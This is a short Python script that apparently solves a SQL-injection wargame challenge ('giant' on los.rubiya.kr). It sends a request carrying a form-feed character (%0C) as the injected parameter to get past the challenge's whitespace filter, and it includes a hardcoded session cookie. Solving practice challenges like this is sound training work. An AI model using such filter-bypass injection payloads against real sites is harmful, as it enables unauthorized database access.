#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt
import urllib.parse

url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php"
parameter = 'shit'
cookie = dict(PHPSESSID='e65uev8hnti7n47a7qe5auesel')

# select 1234 from{$_GET[shit]}prob_giant where 1

sqli = "%0C"
# sqli = urllib.parse.quote(sqli)

query_url = "%s?%s=%s" % (url,parameter,sqli)
print("[*]%s" % query_url)

http_request=requests.get(query_url,cookies=cookie)
res = bs(http_request.text,"html.parser")

print(res.text)

# page feed FF 0xc can also work to bypass the whitespace filter
